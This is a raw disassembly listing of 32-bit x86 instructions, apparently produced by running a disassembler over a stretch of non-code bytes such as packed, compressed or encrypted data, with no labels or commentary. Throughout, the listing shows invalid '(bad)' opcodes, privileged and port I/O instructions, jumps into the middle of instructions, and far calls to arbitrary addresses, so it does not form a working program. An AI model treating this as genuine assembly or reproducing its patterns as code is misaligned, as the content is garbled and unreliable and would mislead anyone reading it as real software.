  429af7:	call   0xfc311576
  429afc:	jb     0x429ae1
  429afe:	and    BYTE PTR [ecx+eax*1],dl
  429b01:	fld    QWORD PTR ds:0xdcc5eefb
  429b07:	fcomp  QWORD PTR [eax-0x10]
  429b0a:	add    al,0x5b
  429b0c:	aas    
  429b0d:	add    eax,0x2b6257c5
  429b12:	inc    edi
  429b13:	mov    esi,0x874ff7e5
  429b18:	add    BYTE PTR [ecx],ah
  429b1a:	test   esp,ebp
  429b1c:	cmp    BYTE PTR [edi],bl
  429b1e:	add    eax,0x820b5300
  429b23:	jne    0x429add
  429b25:	xor    eax,0x52ff398d
  429b2a:	jnp    0x429b89
  429b2c:	or     bl,bh
  429b2e:	xor    DWORD PTR [ebx+0x4c],0x1d
  429b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b33:	inc    ebp
  429b34:	dec    DWORD PTR ds:0xc8e8400
  429b3a:	add    eax,0x91e8d00
  429b3f:	mov    DWORD PTR [ebp+0x75],eax
  429b42:	cmp    dh,bh
  429b44:	jne    0x429bbb
  429b46:	inc    edi
  429b47:	add    DWORD PTR [ebx+0x0],0x0
	...
  429b5f:	add    BYTE PTR [eax],al
  429b61:	add    BYTE PTR [edi+0x320460dc],ah
  429b67:	repnz cmp eax,0x54
  429b6b:	jo     0x429b65
  429b6d:	xor    DWORD PTR [edx],0xfffffff2
  429b70:	jne    0x429b96
  429b72:	sti    
  429b73:	add    eax,0x4a190f01
  429b78:	add    DWORD PTR [eax],eax
  429b7a:	popf   
  429b7b:	pop    esp
  429b7c:	mov    BYTE PTR [ebx],dl
  429b7e:	lea    eax,[edi+esi*8]
  429b81:	xor    eax,0x3be4d1
  429b86:	repnz neg DWORD PTR [ebx]
  429b89:	adc    ebx,DWORD PTR [ebp+0x4]
  429b8c:	cmp    eax,0x48c02
  429b91:	jmp    0x429ee2
  429b96:	mov    bl,ah
  429b98:	and    BYTE PTR [eax],0x5d
  429b9b:	add    al,0x4f
  429b9d:	call   0x42c047
  429ba2:	loopne 0x429b3a
  429ba4:	enter  0x32fd,0xf1
  429ba8:	call   0xf53f900a
  429bad:	sti    
  429bae:	jno    0x429c11
  429bb0:	ret    
  429bb1:	std    
  429bb2:	cmp    edi,DWORD PTR [edi-0x765672b1]
  429bb8:	or     al,0x2b
  429bbb:	(bad)  
  429bbc:	mov    esp,0x87ddf461
  429bc1:	inc    ebp
  429bc2:	sbb    bl,BYTE PTR [edx-0x41]
  429bc5:	je     0x429bc7
	...
  429bdf:	fidiv  WORD PTR [edx+0x0]
  429be2:	sti    
  429be3:	xor    DWORD PTR [ecx-0x3de78a78],0x9e420afe
  429bed:	in     al,dx
  429bee:	fmul   DWORD PTR [edi]
  429bf0:	sahf   
  429bf1:	add    BYTE PTR [edi-0x10],0xba
  429bf5:	mov    esi,0xfe2e4b50
  429bfa:	out    0x22,eax
  429bfc:	out    0xf4,eax
  429bfe:	sti    
  429bff:	adc    eax,0x503188d3
  429c05:	out    0x82,eax
  429c07:	push   ebp
  429c08:	fdivp  st(7),st
  429c0a:	mov    eax,0xffffdcca
  429c0f:	and    DWORD PTR [eax-0x39],0xbd2eabfd
  429c16:	add    ah,dh
  429c18:	popf   
  429c19:	inc    esi
  429c1a:	jne    0x429bb9
  429c1c:	in     eax,0x42
  429c1e:	cli    
  429c1f:	add    esp,DWORD PTR [edx-0x41]
  429c22:	add    ah,dh
  429c24:	(bad)  [ecx+0x0]
  429c27:	push   cs
  429c28:	fiadd  WORD PTR [edx+0x308d7c45]
  429c2e:	rcr    BYTE PTR [ecx+ebp*2-0x6],0xfa
  429c33:	imul   esi,DWORD PTR [edx+0x60f3f83a],0xffffffa7
  429c3a:	add    ah,dh
  429c3c:	add    al,0xe9
  429c3e:	jle    0x429c11
  429c40:	in     al,dx
  429c41:	push   ecx
  429c42:	xor    al,0x0
	...
  429c5c:	rol    DWORD PTR [ecx+ebp*8],0x5d
  429c60:	stc    
  429c61:	jns    0x429c87
  429c63:	hlt    
  429c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429c65:	fdivr  QWORD PTR [esi+eax*1]
  429c68:	das    
  429c69:	out    0x65,eax
  429c6b:	les    esp,FWORD PTR [eax-0x5e78b4f3]
  429c71:	hlt    
  429c72:	in     al,0x78
  429c74:	jmp    0x6c4f:0x224959f7
  429c7b:	push   ecx
  429c7c:	sbb    ah,bl
  429c7e:	or     eax,0x5ee6ff1a
  429c83:	push   ecx
  429c84:	in     al,dx
  429c85:	(bad)  
  429c87:	xor    eax,0x78a981b4
  429c8c:	pop    edx
  429c8d:	idiv   BYTE PTR [edx]
  429c8f:	dec    ecx
  429c90:	call   0xf2babdd2
  429c95:	cmp    al,0xb1
  429c97:	js     0x429cc1
  429c99:	mov    edi,0xd9f5f2a4
  429c9e:	mov    ds:0x57684369,eax
  429ca3:	or     BYTE PTR [ecx+0x3e],al
  429ca6:	je     0x429cf1
  429ca8:	ins    BYTE PTR es:[edi],dx
  429ca9:	fst    QWORD PTR [eax-0x401950d4]
  429caf:	call   FWORD PTR [ecx]
  429cb1:	std    
  429cb2:	sub    DWORD PTR [ecx],edi
  429cb4:	mov    esp,0x8f03a6cf
  429cb9:	adc    ch,al
  429cbb:	adc    al,0x34
  429cbd:	add    eax,0xf45e
	...
  429cd6:	add    BYTE PTR [eax],al
  429cd8:	add    BYTE PTR [ecx-0x11],bh
  429cdb:	xchg   ebp,eax
  429cdc:	sbb    al,0x73
  429cde:	inc    eax
  429cdf:	adc    eax,0x704ef45e
  429ce4:	adc    dh,BYTE PTR [ebx+0x5]
  429ce7:	add    BYTE PTR [ecx-0x16c20735],al
  429ced:	mov    edi,0xf7eb0004
  429cf2:	ja     0x429d71
  429cf4:	mov    eax,ds:0xc10442c8
  429cf9:	inc    edi
  429cfa:	sub    eax,0xc573cefb
  429cff:	jne    0x429cf0
  429d01:	int    0xdc
  429d03:	dec    eax
  429d04:	cmp    eax,esi
  429d06:	add    al,0xfb
  429d08:	cmp    al,0x14
  429d0a:	fld    QWORD PTR [eax+0x39]
  429d0d:	lock add al,0x80
  429d10:	and    al,0x7
  429d12:	add    eax,0xe9b7650b
  429d17:	sti    
  429d18:	xchg   esi,eax
  429d19:	sub    BYTE PTR [edi-0x8],0x81
  429d1d:	cmp    eax,0x7786fb00
  429d22:	addr16 sti 
  429d24:	jmp    0xeb349995
  429d29:	clc    
  429d2a:	stc    
  429d2b:	test   bl,dh
  429d2d:	in     eax,0xe9
  429d2f:	sti    
  429d30:	(bad)  
  429d31:	je     0x429da2
  429d33:	mov    eax,0xfb2c4151
  429d38:	push   esi
  429d39:	(bad)  
  429d3a:	push   ebp
  429d3b:	push   eax
  429d3c:	inc    ecx
	...
  429d55:	add    BYTE PTR ds:0x4a46fa79,dh
  429d5b:	fisttp QWORD PTR [eax]
  429d5d:	mov    ecx,0x2f8704f7
  429d62:	mov    edi,0xa62e33d5
  429d67:	dec    edx
  429d68:	das    
  429d69:	sub    DWORD PTR [edx-0x44],eax
  429d6c:	mov    esi,0x874ff7e5
  429d71:	add    eax,0xba74d87a
  429d76:	sbb    eax,0x66006652
  429d7b:	test   BYTE PTR [ebp-0x34],dh
  429d7e:	xchg   ebp,eax
  429d7f:	leave  
  429d80:	sub    esi,esi
  429d82:	push   0xfffffff3
  429d84:	xor    DWORD PTR [ebp+0x55],0x7e
  429d88:	gs cld 
  429d8a:	pop    ebp
  429d8b:	jmp    0x429d8b
  429d8d:	add    BYTE PTR [edi+0x3d7452fe],ah
  429d93:	inc    edi
  429d94:	adc    BYTE PTR [ebp-0x72b002ed],cl
  429d9a:	mov    eax,0x45c383f4
  429d9f:	repz pushf 
  429da1:	add    BYTE PTR ds:0x2187666,cl
  429da7:	hlt    
  429da8:	adc    eax,0x410fc4
  429dad:	push   eax
  429dae:	ret    0x7d65
  429db1:	hlt    
  429db2:	xchg   esi,eax
  429db3:	mov    edi,0x89e9e8
  429db8:	add    BYTE PTR [ebx+0x0],dl
	...
  429dd3:	push   0x5850424f
  429dd8:	je     0x429dd2
  429dda:	mov    ecx,DWORD PTR [esi-0x32632d3f]
  429de0:	or     bh,dh
  429de2:	jne    0x429e39
  429de4:	fs inc ebp
  429de6:	int3   
  429de7:	sub    bl,BYTE PTR [esp+esi*8-0x73]
  429deb:	test   al,0x64
  429ded:	div    DWORD PTR [ebp+0x29]
  429df0:	cmp    DWORD PTR [edx+0x20],esp
  429df3:	push   esi
  429df4:	ror    al,0x5e
  429df7:	popf   
  429df8:	or     BYTE PTR [ebx-0x3c],bh
  429dfb:	mov    ebp,0xba1ff889
  429e00:	mov    ebp,DWORD PTR [esi-0x7cf76300]
  429e06:	(bad)  
  429e07:	dec    ebp
  429e08:	inc    edx
  429e09:	add    DWORD PTR [eax-0xc],ebp
  429e0c:	xchg   ebp,eax
  429e0d:	sar    DWORD PTR [edi],1
  429e0f:	hlt    
  429e10:	adc    dl,BYTE PTR [ebx]
  429e12:	and    BYTE PTR [edi],al
  429e14:	scas   al,BYTE PTR es:[edi]
  429e15:	dec    DWORD PTR [eax-0x3f7d2a4f]
  429e1b:	repz jno 0x429dab
  429e1e:	add    ah,dh
  429e20:	in     eax,dx
  429e21:	lock adc eax,0x3fdf00
  429e27:	or     DWORD PTR [ebx-0x1],edi
  429e2a:	push   esp
  429e2c:	inc    eax
  429e2d:	sti    
  429e2e:	cli    
  429e2f:	shl    ebp,0xf0
  429e32:	adc    eax,0x3fbef8
	...
  429e4f:	add    BYTE PTR [edi+0x49],dh
  429e52:	cld    
  429e53:	push   DWORD PTR [esi+0x19]
  429e56:	cld    
  429e57:	jmp    DWORD PTR [edi-0x61a7a5ea]
  429e5d:	aad    0xf0
  429e5f:	xor    eax,0x449c2c
  429e64:	add    esp,ecx
  429e66:	and    edx,DWORD PTR [ecx]
  429e68:	mov    ah,0xed
  429e6a:	jl     0x429e64
  429e6c:	jns    0x429df8
  429e6e:	jae    0x429ecd
  429e70:	jg     0x429e32
  429e72:	cmp    edx,DWORD PTR [edx]
  429e74:	xor    al,0xee
  429e76:	pop    ebp
  429e77:	adc    BYTE PTR [ecx+0x2b],ch
  429e7a:	or     BYTE PTR [eax-0x7f],dl
  429e7d:	mov    dl,0x3
  429e7f:	push   eax
  429e80:	retf   
  429e81:	push   ds
  429e82:	jl     0x429e86
  429e84:	dec    esi
  429e85:	clc    
  429e86:	jbe    0x429e8b
  429e88:	ja     0x429eb5
  429e8a:	adc    ecx,DWORD PTR [ebp+0x5059c23b]
  429e90:	stos   DWORD PTR es:[edi],eax
  429e91:	(bad)  
  429e92:	jnp    0x429ed9
  429e94:	in     al,dx
  429e95:	outs   dx,BYTE PTR ds:[esi]
  429e96:	ret    
  429e97:	sbb    BYTE PTR [edx],dl
  429e99:	outs   dx,DWORD PTR ds:[esi]
  429e9a:	jo     0x429ee8
  429e9c:	hlt    
  429e9d:	add    al,0x70
  429e9f:	dec    eax
  429ea0:	and    al,0x59
  429ea2:	les    eax,FWORD PTR [ebx+0x77e8fcff]
  429ea8:	fild   QWORD PTR [edx+0x66]
  429eab:	jo     0x429e67
  429ead:	add    al,0x7d
  429eaf:	or     eax,edi
  429eb1:	ins    BYTE PTR es:[edi],dx
  429eb2:	ret    
	...
  429ecb:	add    BYTE PTR [eax],al
  429ecd:	and    al,BYTE PTR ds:0xcf40381
  429ed3:	jmp    0xe94e25b3
  429ed8:	add    esi,DWORD PTR [ecx-0x3c]
  429edb:	push   ebp
  429edc:	or     BYTE PTR [ebp+eax*1-0x1358eb42],al
  429ee3:	call   0xfc79:0xc204f45e
  429eea:	in     al,dx
  429eeb:	loop   0x429f67
  429eed:	push   ds
  429eee:	jecxz  0x429ee7
  429ef0:	ret    
  429ef1:	mov    edi,0x52bd0e42
  429ef6:	or     cl,ch
  429ef8:	pop    eax
  429ef9:	jae    0x429eeb
  429efb:	callw  0x25fb
  429eff:	test   DWORD PTR [eax-0x55],esp
  429f02:	cmp    dh,BYTE PTR [edx]
  429f04:	pop    edx
  429f05:	repnz push 0xffffffc8
  429f08:	sbb    BYTE PTR [eax],ch
  429f0a:	pop    ecx
  429f0b:	xchg   ecx,eax
  429f0c:	xchg   edi,eax
  429f0d:	mov    DWORD PTR ds:0x29307ce9,0x58b488cd
  429f17:	jmp    0x429f5c
  429f19:	fnsave [edx-0x18]
  429f1c:	add    esi,esp
  429f1e:	outs   dx,BYTE PTR ds:[esi]
  429f1f:	pop    eax
  429f20:	out    dx,eax
  429f21:	loope  0x429f8f
  429f23:	test   DWORD PTR [ebx-0xc],0x14194234
  429f2a:	imul   DWORD PTR [eax+0x998c03]
  429f30:	adc    DWORD PTR [eax],eax
	...
  429f4a:	lock add al,0x84
  429f4d:	sub    DWORD PTR [ebx-0x817b77a],edx
  429f53:	add    al,0xe9
  429f55:	xabort 0x4
  429f58:	add    BYTE PTR [edx+0x34],ah
  429f5b:	sub    DWORD PTR [eax],edx
  429f5d:	pop    esp
  429f5e:	int3   
  429f5f:	sub    BYTE PTR [ecx+edx*1],dl
  429f62:	mov    esp,0xe0e9003b
  429f67:	dec    eax
  429f68:	and    al,0xe5
  429f6a:	jbe    0x429f49
  429f6c:	sti    
  429f6d:	fidivr WORD PTR [ebx-0x57]
  429f70:	add    cl,ch
  429f72:	mul    DWORD PTR [ecx+0x64]
  429f75:	add    eax,0x39660518
  429f7a:	jne    0x429fc5
  429f7c:	and    al,0x1
  429f7e:	into   
  429f7f:	add    al,0x50
  429f81:	sar    DWORD PTR [edi+edi*1+0x609ee901],1
  429f88:	and    al,0x9
  429f8a:	ja     0x429f55
  429f8c:	or     al,0x6a
  429f8e:	mov    ds:0x8ced0c28,eax
  429f93:	pop    edx
  429f94:	sti    
  429f95:	(bad)  
  429f96:	adc    bh,al
  429f98:	ret    
  429f99:	sti    
  429f9a:	mov    bh,0x4
  429f9c:	jg     0x429f2f
  429f9e:	pop    ss
  429f9f:	pop    eax
  429fa0:	ins    DWORD PTR es:[edi],dx
  429fa1:	jb     0x429fc5
  429fa3:	nop
  429fa4:	dec    esp
  429fa5:	lds    ebx,FWORD PTR [ebx]
  429fa7:	xor    edx,edi
  429fa9:	arpl   cx,si
  429fab:	(bad)  
  429fac:	push   eax
  429fad:	cdq    
	...
  429fc6:	add    BYTE PTR [edi-0x26],dh
  429fc9:	or     esi,ebx
  429fcb:	repz mov bh,BYTE PTR [esi+0x508fe952]
  429fd2:	xchg   esi,eax
  429fd3:	ja     0x429faf
  429fd5:	add    eax,0xc908fbd6
  429fda:	add    BYTE PTR [esi-0x24],al
  429fdd:	mov    WORD PTR [eax+0x42],ss
  429fe0:	xchg   dl,dh
  429fe2:	add    eax,0xa903fa5a
  429fe7:	sbb    edi,ecx
  429fe9:	je     0x429ff2
  429feb:	test   DWORD PTR [eax],ecx
  429fed:	inc    ecx
  429fee:	xor    dh,BYTE PTR [esi]
  429ff0:	mov    edi,0x9edbfff
  429ff5:	mov    BYTE PTR [ecx],al
  429ff7:	into   
  429ff8:	or     BYTE PTR [esi],bh
  429ffa:	jmp    0x42a016
  429ffc:	mov    al,al
  429ffe:	jne    0x42a045
  42a000:	mov    ebx,edx
  42a002:	jne    0x42a02d
  42a004:	retf   0x2444
  42a007:	cmp    eax,0x5d000008
  42a00c:	lock outs dx,DWORD PTR ds:[esi]
  42a00e:	or     dh,al
  42a010:	push   edi
  42a011:	or     al,0xff
  42a013:	call   0xe814:0xf95c8d0c
  42a01a:	jg     0x42a051
  42a01c:	out    dx,eax
  42a01d:	test   DWORD PTR [ebp+0x50202cd9],0xfffd9d35
  42a027:	bound  ebx,QWORD PTR [ebx+0x44]
  42a02a:	and    al,0x0
	...
  42a044:	add    DWORD PTR [ebp+0x50d6dd5],edi
  42a04a:	lea    eax,[ecx+ebp*1-0xb]
  42a04e:	dec    edi
  42a04f:	call   0x39c6c0
  42a054:	pop    eax
  42a055:	leave  
  42a056:	pop    es
  42a057:	test   DWORD PTR [ebp+0x50fff7f1],ebx
  42a05d:	dec    ebp
  42a05e:	and    al,0x18
  42a060:	in     eax,dx
  42a061:	rcl    BYTE PTR [eax-0x7c0dac5b],0xd8
  42a068:	pop    eax
  42a069:	into   
  42a06a:	je     0x42a0b3
  42a06c:	hlt    
  42a06d:	bound  esi,QWORD PTR [eax+0x24]
  42a070:	or     al,0x69
  42a072:	in     eax,dx
  42a073:	je     0x42a062
  42a075:	push   edx
  42a076:	icebp  
  42a077:	jg     0x42a091
  42a079:	or     ah,BYTE PTR [eax+eax*1]
  42a07c:	push   cs
  42a07d:	jle    0x42a0f9
  42a07f:	inc    esp
  42a080:	fadd   DWORD PTR ds:0xf6240056
  42a086:	jb     0x42a0e4
  42a088:	cmc    
  42a089:	in     eax,dx
  42a08a:	add    ah,0xe8
  42a08d:	sub    DWORD PTR [ecx],0xffffff8d
  42a090:	mov    eax,0xc45227c9
  42a095:	push   es
  42a096:	adc    ecx,DWORD PTR [edx+ecx*1-0x52]
  42a09a:	(bad)  
  42a09b:	jle    0x42a0cd
  42a09d:	jmp    0xe84f:0xce18447a
  42a0a4:	xlat   BYTE PTR ds:[ebx]
  42a0a5:	call   0x439c96
	...
  42a0be:	add    BYTE PTR [eax],al
  42a0c0:	add    BYTE PTR [edi-0x58],dh
  42a0c3:	sub    DWORD PTR [ebx-0x3f],ecx
  42a0c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a0c7:	push   eax
  42a0c8:	call   0x46c191
  42a0cd:	pushf  
  42a0ce:	fnsave [edx+0x0]
  42a0d1:	hlt    
  42a0d2:	sahf   
  42a0d3:	xor    bh,ah
  42a0d5:	adc    BYTE PTR [ebx],ch
  42a0d7:	add    al,0xfb
  42a0d9:	jmp    0xf482b1af
  42a0de:	call   0xee36a1e4
  42a0e3:	cld    
  42a0e4:	cmp    DWORD PTR [edi+0x76],0xffffffec
  42a0e8:	sti    
  42a0e9:	repz stc 
  42a0eb:	daa    
  42a0ec:	sbb    al,0xdc
  42a0ee:	bnd jbe 0x42a0eb
  42a0f1:	jecxz  0x42a08d
  42a0f3:	mov    edi,0x78f33a5b
  42a0f8:	in     eax,0x31
  42a0fa:	lods   al,BYTE PTR ds:[esi]
  42a0fb:	add    eax,DWORD PTR [eax]
  42a0fd:	and    DWORD PTR ds:0xf143df6e,eax
  42a103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a104:	push   eax
  42a105:	cmp    BYTE PTR es:[edx+0x76],dl
  42a109:	add    BYTE PTR [edx+0x59afafac],dl
  42a10f:	icebp  
  42a110:	js     0x42a0b6
  42a112:	in     al,dx
  42a113:	jg     0x42a109
  42a115:	lahf   
  42a116:	fbld   TBYTE PTR [esi+0x66]
  42a119:	mov    WORD PTR [esp+ebx*2],es
  42a11c:	inc    esi
  42a11d:	mov    BYTE PTR [ecx+edx*1],dh
  42a120:	ficomp WORD PTR [eax-0x22]
  42a123:	sbb    bh,BYTE PTR [eax+0x0]
	...
  42a13e:	pushf  
  42a13f:	lea    esi,[ebx+edi*8+0xc94bb78]
  42a146:	jns    0x42a191
  42a148:	inc    ebp
  42a149:	push   ebx
  42a14a:	adc    eax,ebp
  42a14c:	test   eax,0xf3a9fcdb
  42a151:	jmp    0x42a1cd
  42a153:	mov    esp,0xec4c765c
  42a158:	push   ecx
  42a159:	mov    BYTE PTR [esi],bh
  42a15b:	fistp  QWORD PTR [edx]
  42a15d:	dec    edx
  42a15e:	jb     0x42a123
  42a160:	cs mov ebp,0x7ee90c72
  42a166:	mov    eax,ds:0xf06166e0
  42a16b:	add    al,0x64
  42a16d:	repnz mov al,ds:0xc66f6415
  42a173:	xchg   ecx,eax
  42a174:	and    al,0xc4
  42a176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a177:	xchg   ecx,eax
  42a178:	xor    bh,BYTE PTR [edx+0x4504f0c]
  42a17e:	hlt    
  42a17f:	mov    DWORD PTR [ecx+0x5e670371],ebp
  42a185:	add    edx,DWORD PTR [esi+0x1a]
  42a188:	sub    al,0xf6
  42a18a:	imul   ecx,DWORD PTR [ebx],0x3377f03
  42a190:	add    BYTE PTR [edi],cl
  42a192:	and    ecx,DWORD PTR [eax-0xc]
  42a195:	cmc    
  42a196:	or     al,0xda
  42a198:	inc    ebp
  42a199:	cmc    
  42a19a:	jp     0x42a15e
  42a19c:	and    BYTE PTR ss:[ebp+0x11],al
  42a1a0:	outs   dx,BYTE PTR ds:[esi]
  42a1a1:	cmp    eax,DWORD PTR [eax]
	...
  42a1bb:	push   ebx
  42a1bc:	shl    DWORD PTR [esi],cl
  42a1be:	pop    esp
  42a1bf:	xor    eax,0xd1d350a1
  42a1c4:	xor    eax,0x9093bc8d
  42a1c9:	inc    ebp
  42a1ca:	loope  0x42a181
  42a1cc:	dec    eax
  42a1cd:	or     ebp,ecx
  42a1cf:	or     BYTE PTR [eax-0x4],bl
  42a1d2:	adc    eax,ebp
  42a1d4:	outs   dx,DWORD PTR ds:[esi]
  42a1d5:	add    cl,ch
  42a1d7:	je     0x42a19e
  42a1d9:	je     0x42a1d6
  42a1db:	repnz inc edi
  42a1dd:	cld    
  42a1de:	fiadd  DWORD PTR [ecx-0x2e]
  42a1e1:	out    dx,eax
  42a1e2:	push   es
  42a1e3:	in     eax,0xc
  42a1e5:	call   0xfc1e364d
  42a1ea:	popa   
  42a1eb:	mov    ch,0x9
  42a1ed:	sti    
  42a1ee:	je     0x42a23f
  42a1f0:	out    0x5c,al
  42a1f2:	push   ebp
  42a1f3:	clc    
  42a1f4:	add    al,0x86
  42a1f6:	cmp    al,0x3f
  42a1f8:	in     eax,dx
  42a1f9:	jno    0x42a1d1
  42a1fb:	push   ds
  42a1fc:	fimul  DWORD PTR [edi-0x3f]
  42a1ff:	in     eax,dx
  42a200:	jo     0x42a202
  42a202:	jmp    0x462c57f0
  42a207:	pminub mm7,mm3
  42a20a:	pop    ds
  42a20b:	xchg   ebx,eax
  42a20c:	rol    DWORD PTR [ebp+0x7e820eb7],cl
  42a212:	jmp    0xf7c8a70e
  42a217:	jnp    0x42a1e7
  42a219:	je     0x42a230
  42a21b:	inc    edi
  42a21c:	cs leave 
  42a21e:	fiadd  DWORD PTR [eax]
	...
  42a238:	fiadd  WORD PTR [esi+esi*8+0xb549d00]
  42a23f:	mov    al,BYTE PTR [ebx]
  42a241:	or     BYTE PTR [eax+0x56dc5fa],al
  42a247:	add    BYTE PTR [edi+0x4a],0x75
  42a24b:	push   es
  42a24c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a24d:	fnstsw WORD PTR [edx-0x3a]
  42a250:	iret   
  42a251:	dec    edx
  42a252:	dec    ebx
  42a253:	mov    dh,BYTE PTR [ebx+0x1dd0525c]
  42a259:	out    dx,eax
  42a25a:	or     DWORD PTR [edi-0x43],esi
  42a25d:	arpl   WORD PTR [edi],ax
  42a25f:	mov    esi,0x4e1c8ff
  42a264:	ret    
  42a265:	push   es
  42a266:	ret    0x1e66
  42a269:	shl    DWORD PTR [eax],0xeb
  42a26c:	stos   DWORD PTR es:[edi],eax
  42a26d:	pop    esp
  42a26e:	push   edx
  42a26f:	mov    edi,0x7705ef0d
  42a274:	ins    DWORD PTR es:[edi],dx
  42a275:	arpl   WORD PTR [edi],ax
  42a277:	mov    esi,0x4e1c92f
  42a27c:	jae    0x42a284
  42a27e:	ret    0xce66
  42a281:	shr    BYTE PTR [edi],0xeb
  42a284:	xor    ebx,DWORD PTR [edx+edx*2-0x61]
  42a288:	fucomp st(6)
  42a28a:	add    eax,0x7634177
  42a28f:	mov    esi,0x4e1c17f
  42a294:	ret    
  42a295:	pop    es
  42a296:	ret    0x9e66
  42a299:	mov    ecx,0xf4f
	...
  42a2b2:	add    BYTE PTR [eax],al
  42a2b4:	add    BYTE PTR [edx-0x6014c167],ah
  42a2ba:	dec    edi
  42a2bb:	test   dl,dl
  42a2bd:	rol    DWORD PTR [edi],1
  42a2bf:	jnp    0x42a290
  42a2c1:	sbb    al,0x63
  42a2c3:	mov    DWORD PTR [eax],ecx
  42a2c5:	xchg   bl,al
  42a2c7:	push   edi
  42a2c8:	pop    esi
  42a2c9:	dec    esi
  42a2ca:	pop    ss
  42a2cb:	leave  
  42a2cc:	push   0xfffffff4
  42a2ce:	in     eax,0x61
  42a2d0:	mov    esp,edi
  42a2d2:	adc    eax,0x8079bf46
  42a2d7:	jo     0x42a32d
  42a2d9:	outs   dx,BYTE PTR ds:[esi]
  42a2da:	fdivr  DWORD PTR [ebx-0x37]
  42a2dd:	dec    eax
  42a2de:	and    al,0x35
  42a2e0:	shl    BYTE PTR [ebp+edx*2+0x13],0x75
  42a2e5:	stc    
  42a2e6:	mov    bh,0x5
  42a2e8:	pop    eax
  42a2e9:	iret   
  42a2ea:	loope  0x42a36b
  42a2ec:	stc    
  42a2ed:	fistp  QWORD PTR [eax-0xbdc202]
  42a2f3:	in     eax,dx
  42a2f4:	out    0xb,eax
  42a2f6:	outs   dx,BYTE PTR ds:[esi]
  42a2f7:	out    0x39,eax
  42a2f9:	sbb    esp,ebp
  42a2fb:	pop    esp
  42a2fc:	repnz dec bl
  42a2ff:	clc    
  42a300:	mov    ecx,0xf104c4bd
  42a305:	sbb    ch,BYTE PTR [edi-0x2a]
  42a308:	xor    bl,ch
  42a30a:	xor    ch,dh
  42a30c:	ds jle 0x42a2f7
  42a30f:	jg     0x42a30a
  42a311:	and    al,0x89
  42a313:	in     eax,0x84
  42a315:	sub    eax,0x7f045a
	...
  42a332:	sub    al,0xed
  42a334:	clc    
  42a335:	mov    dl,0x42
  42a337:	inc    esi
  42a338:	add    dh,BYTE PTR [edx+esi*8-0x7c]
  42a33c:	mov    dh,0xfb
  42a33e:	inc    ebx
  42a33f:	out    dx,al
  42a340:	jmp    DWORD PTR [ecx+0x6d]
  42a343:	jmp    0x42a38e
  42a345:	mov    edi,0x85dade7
  42a34a:	xchg   edx,eax
  42a34b:	add    BYTE PTR fs:[eax+0x37],bl
  42a34f:	stc    
  42a350:	jl     0x42a33e
  42a352:	(bad)
  42a355:	inc    ebp
  42a356:	cld    
  42a357:	std    
  42a358:	pop    ecx
  42a359:	or     BYTE PTR [ebx],cl
  42a35b:	adc    esp,edi
  42a35d:	or     al,BYTE PTR cs:0xf4ac0ea2
  42a364:	sub    BYTE PTR [ecx+edi*2],al
  42a367:	les    ebx,FWORD PTR ds:0xe151ef27
  42a36d:	fcmovnbe st,st(3)
  42a36f:	jno    0x42a2f3
  42a371:	call   0xf1a777e9
  42a376:	dec    eax
  42a377:	and    esp,DWORD PTR [esi+0x66]
  42a37a:	clc    
  42a37b:	add    al,0xf5
  42a37d:	and    esi,DWORD PTR [ecx+0x41]
  42a380:	gs push ebx
  42a382:	push   edx
  42a383:	add    DWORD PTR [edx+0x6e],ebx
  42a386:	add    BYTE PTR [edi-0x1b],ch
  42a389:	call   0xe8cb0af
  42a38e:	aam    0xf4
  42a390:	test   al,0x3
  42a392:	jno    0x42a358
  42a394:	mov    ah,0xfb
	...
  42a3ae:	add    BYTE PTR ds:0xf45ce6ed,ah
  42a3b4:	add    al,0xf6
  42a3b6:	icebp  
  42a3b7:	jg     0x42a40a
  42a3b9:	icebp  
  42a3ba:	call   0x4438a4a0
  42a3bf:	hlt    
  42a3c0:	(bad)  
  42a3c1:	sub    ecx,DWORD PTR [ecx+0x3d]
  42a3c4:	(bad)  
  42a3c5:	loope  0x42a3ca
  42a3c7:	leave  
  42a3c8:	(bad)  
  42a3c9:	adc    eax,0x92f84884
  42a3ce:	push   eax
  42a3cf:	and    ebx,esp
  42a3d1:	call   0xe537:0xd4dbf05d
  42a3d8:	inc    esp
  42a3d9:	jmp    0xb1c9e858
  42a3de:	out    0xeb,eax
  42a3e0:	aam    0x5d
  42a3e2:	xor    DWORD PTR [ecx+0x41],edi
  42a3e5:	lds    edx,FWORD PTR [esi+eax*8-0x3d]
  42a3e9:	sub    al,0xe0
  42a3eb:	clc    
  42a3ec:	add    al,0xe9
  42a3ee:	add    ecx,DWORD PTR [edi]
  42a3f0:	icebp  
  42a3f1:	dec    DWORD PTR [eax-0x1f]
  42a3f4:	inc    esp
  42a3f5:	add    dl,al
  42a3f7:	in     al,0x83
  42a3f9:	inc    ebp
  42a3fa:	cdq    
  42a3fb:	iret   
  42a3fc:	inc    ecx
  42a3fd:	or     BYTE PTR [ecx+edi*8],dl
  42a400:	inc    ebp
  42a401:	lea    ebp,[esp+edx*8]
  42a404:	xor    eax,0x61058e52
  42a409:	adc    DWORD PTR [ecx],ebp
  42a40b:	lock jg 0x42a3ce
  42a40e:	hlt    
  42a40f:	scas   eax,DWORD PTR es:[edi]
  42a410:	aaa    
  42a411:	sti    
  42a412:	fadd   QWORD PTR [eax]
	...
  42a42c:	retf   
  42a42d:	or     eax,DWORD PTR [eax-0x17]
  42a430:	ds (bad) 
  42a432:	pop    ebx
  42a433:	(bad)  
  42a434:	js     0x42a3d1
  42a436:	add    al,0xe9
  42a438:	inc    esp
  42a439:	sub    ah,0x6a
  42a43c:	int3   
  42a43d:	std    
  42a43e:	dec    esi
  42a43f:	pop    esp
  42a440:	xor    eax,0xaefa50dd
  42a445:	dec    edx
  42a446:	or     WORD PTR [ebx+0x37db67f0],bx
  42a44d:	add    eax,0x34e52e50
  42a452:	adc    BYTE PTR [ecx-0x6b3f8009],ch
  42a458:	add    DWORD PTR [eax+0x62c01145],ecx
  42a45e:	and    BYTE PTR [ebx-0x4eea21a6],al
  42a464:	pop    es
  42a465:	inc    ebp
  42a466:	add    BYTE PTR [eax+edi*1+0x50],ah
  42a46a:	add    al,0xbb
  42a46c:	aaa    
  42a46d:	loop   0x42a4bb
  42a46f:	pop    esp
  42a470:	mov    ch,0xe8
  42a472:	push   eax
  42a473:	out    0xc4,al
